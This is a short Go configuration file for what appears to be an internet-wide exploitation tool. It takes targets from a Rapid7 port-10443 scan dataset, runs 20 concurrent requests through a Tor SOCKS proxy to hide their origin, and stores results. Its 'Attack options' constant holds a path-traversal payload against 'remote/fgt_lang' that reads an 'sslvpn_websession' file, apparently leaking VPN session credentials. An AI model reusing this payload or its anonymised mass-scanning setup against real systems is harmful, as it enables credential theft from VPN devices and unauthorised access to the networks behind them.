package config

import "time"

// Channel buffer sizes
const CleanAndParsedResponsesChanBufferSize = 100
const ResponsesChanBufferSize int = 100
const ParsedTargetsChanBufferSize int = 100
const FileLinesChanBufferSize int = 100

// Max concurrent request limit
const MaxConcurrentHttpRequests = 20

// File directories
const Rapid7InputJsonFilePath = "data/2019-07-28-1564288004-https_get_10443.json"
const OutputFilePath = "results.txt"

// Default bufio scanner buffer size when reading files
const BufioScannerBufferSize int = 1 << 20 // 1MB

// HTTP Client / TOR config
const TorCheckURL string = "https://check.torproject.org/"
const YouAreUsingTorString string = "Congratulations. This browser is configured to use Tor."
const TorProxyString string = "socks5://127.0.0.1:9150" // 9150 with Tor Browser, 9050 with Tor
const HttpClientTimeout = 90 * time.Second              // High timeout because we are using TOR

// Attack options
const PayloadPath string = "remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
